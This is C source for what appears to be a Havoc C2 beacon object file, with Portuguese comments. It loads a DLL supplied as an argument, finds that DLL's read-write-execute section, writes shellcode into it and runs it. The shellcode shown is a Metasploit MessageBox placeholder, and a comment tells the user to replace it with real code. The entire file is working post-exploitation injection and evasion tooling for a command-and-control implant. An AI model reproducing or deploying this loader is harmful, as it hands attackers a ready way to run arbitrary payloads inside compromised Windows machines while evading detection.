#include <windows.h>
#include "beacon.h"
#include <psapi.h>
#include <dbghelp.h>

#pragma comment(lib, "dbghelp.lib")

WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
WINBASEAPI BOOL WINAPI KERNEL32$GetModuleInformation(HANDLE hProcess, HMODULE hModule, LPMODULEINFO lpmodinfo, DWORD cb);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

#define HAVOC_CONSOLE_GOOD 0x90
#define HAVOC_CONSOLE_INFO 0x91
#define HAVOC_CONSOLE_ERROR 0x92

typedef struct SectionDescriptor {
    LPVOID start;
    LPVOID end;
} SectionDescriptor;

DWORD_PTR FindRWXOffset(HMODULE hModule) {
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader != NULL) {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) &&
                (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
                return sectionHeader->VirtualAddress;
            }
            sectionHeader++;
        }
    }
    return 0;
}

DWORD_PTR FindRWXSize(HMODULE hModule) {
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader != NULL) {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) &&
                (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
                return sectionHeader->SizeOfRawData;
            }
            sectionHeader++;
        }
    }
    return 0;
}

void WriteCodeToSection(LPVOID rwxSectionAddr, unsigned char* shellcode, SIZE_T sizeShellcode) {
    DWORD oldProtect;
    VirtualProtect(rwxSectionAddr, sizeShellcode, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(rwxSectionAddr, shellcode, sizeShellcode);
    VirtualProtect(rwxSectionAddr, sizeShellcode, oldProtect, &oldProtect);
}

void ExecuteCodeFromSection(LPVOID rwxSectionAddr) {
    ((void(*)())rwxSectionAddr)();
}

VOID go(PVOID Buffer, ULONG Length) {
    datap Parser;
    char* DllPath = NULL;
    LPVOID rwxSectionAddr;
    SIZE_T shellcodesize = 512; // Ajuste conforme necessário

    BeaconDataParse(&Parser, Buffer, Length);
    DllPath = BeaconDataExtract(&Parser, NULL);

    HMODULE hDll = KERNEL32$LoadLibraryA(DllPath);
    if (hDll == NULL) {
        BeaconPrintf(HAVOC_CONSOLE_ERROR, "Falha ao carregar a DLL: %s", DllPath);
        return;
    }

    MODULEINFO moduleInfo;
    if (!KERNEL32$GetModuleInformation(GetCurrentProcess(), hDll, &moduleInfo, sizeof(MODULEINFO))) {
        BeaconPrintf(HAVOC_CONSOLE_ERROR, "Falha ao obter informações do módulo.");
        return;
    }

    DWORD_PTR RWX_SECTION_OFFSET = FindRWXOffset(hDll);
    DWORD_PTR RWX_SECTION_SIZE = FindRWXSize(hDll);

    rwxSectionAddr = (LPVOID)((PBYTE)moduleInfo.lpBaseOfDll + RWX_SECTION_OFFSET);

    SectionDescriptor descriptor = { rwxSectionAddr, (LPVOID)((PBYTE)rwxSectionAddr + RWX_SECTION_SIZE) };
    BeaconPrintf(HAVOC_CONSOLE_INFO, "Seção RWX encontrada de 0x%p a 0x%p", descriptor.start, descriptor.end);

    // Simulação de shellcode - substitua por código real
    unsigned char payload[] = "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
        "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
        "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
        "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
        "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
        "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
        "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
        "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
        "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
        "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
        "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
        "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
        "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
        "\x8d\x8d\x2a\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
        "\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
        "\x00\x3e\x4c\x8d\x85\x1f\x01\x00\x00\x48\x31\xc9\x41\xba"
        "\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
        "\x56\xff\xd5\x48\x65\x6c\x6c\x6f\x2c\x20\x66\x72\x6f\x6d"
        "\x20\x4d\x53\x46\x21\x00\x4d\x65\x73\x73\x61\x67\x65\x42"
        "\x6f\x78\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00";

    WriteCodeToSection(rwxSectionAddr, payload, sizeof(payload));
    BeaconPrintf(HAVOC_CONSOLE_GOOD, "Shellcode escrito, executando...");
    ExecuteCodeFromSection(rwxSectionAddr);
}
